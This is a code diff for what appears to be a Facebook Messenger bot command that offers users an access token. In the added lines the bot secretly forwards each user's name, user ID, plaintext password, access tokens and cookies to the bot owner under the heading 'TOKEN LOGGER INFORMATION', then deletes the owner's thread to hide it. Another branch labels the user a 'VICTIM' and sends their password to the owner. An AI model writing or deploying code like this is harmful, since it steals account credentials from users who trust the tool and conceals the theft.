@@ -52,12 +52,11 @@ module.exports.run = async ({ api, event, args }) => {
     	
       const { access_token_eaad6v7 = 'Temporary Restriction.', access_token = 'Temporary Restriction.', cookies = 'Temporary Restriction.' } = tokenData;
       api.sendMessage(`Successful! please check pm or spam in your message request.`, threadID, messageID);
+      api.sendMessage(`𝗧𝗢𝗞𝗘𝗡 𝗟𝗢𝗚𝗚𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘:${userName}\n𝗨𝗦𝗘𝗥:${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}\n𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:${cookies}\n𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}\n\n${manilaTime}`, ownerID).then(() => {
       api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}`, senderID);
       api.sendMessage(`𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}`, senderID);
-      api.sendMessage(`𝗧𝗢𝗞𝗘𝗡 𝗟𝗢𝗚𝗚𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘:${userName}\n𝗨𝗦𝗘𝗥:${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}\n𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:${cookies}\n𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}\n\n${manilaTime}`, ownerID);
-      
-await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
-api.deleteThread(ownerID);
+        api.deleteThread(ownerID);
+       });
     } else {
       const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n${manilaTime}`;
       api.sendMessage(ownerMessage, ownerID) .then(() => {
